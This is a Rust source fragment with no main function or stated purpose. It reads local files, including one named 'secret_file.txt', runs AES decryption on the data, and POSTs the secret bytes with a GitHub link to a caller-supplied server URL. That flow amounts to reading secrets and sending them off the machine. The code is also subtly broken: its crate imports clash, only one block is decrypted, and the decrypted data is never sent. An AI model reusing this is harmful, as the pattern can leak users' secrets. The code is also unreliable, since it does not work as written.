use std::fs::File;
use std::io::{self, Read};
use aes::cipher::KeyInit;
use aes::Aes256;
use aes::block_cipher_trait::{BlockCipher, generic_array::GenericArray};
use reqwest::blocking::Client;
use aes::cipher::BlockDecrypt;
use reqwest::StatusCode;
use serde_json::json;

fn scan_system (file_path: &str) -> Result<String, io::Error> {
    let mut file = File::open(file_path)?;
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;
    Ok(contents)
}

fn parse_secret() -> Result<Vec<u8>, io::Error> {
    let mut file = File::open("secret_file.txt")?;
    let mut secret_key = Vec::new();
    file.read_to_end(&mut secret_key)?;
    Ok(secret_key)
}

fn decrypt_file(encrypted_data: &[u8], key: &[u8]) -> Vec<u8> {
    let key = GenericArray::from_slice(key);
    let cipher = Aes256::new(&key);
    let mut decrypted_data = encrypted_data.to_vec();
    cipher.decrypt_block(GenericArray::from_mut_slice(&mut decrypted_data));
    decrypted_data
}


fn send_contents(decrypted_data: Vec<u8>, server_url: &str, parsed_secret: &[u8], github_link: &str) -> Result<(), reqwest::Error> {
    let client = Client::new();
    let json_body = json!({
        "message": parsed_secret,
        "github_link": github_link
    });

    let response = client
        .post(server_url)
        .json(&json_body)
        .send()?;
    
    if response.status() == StatusCode::OK {
        println!("File sent successfully to server");
    } else {
        println!("Failed to send file to server: {:?}", response.status());
    }

    Ok(())
}
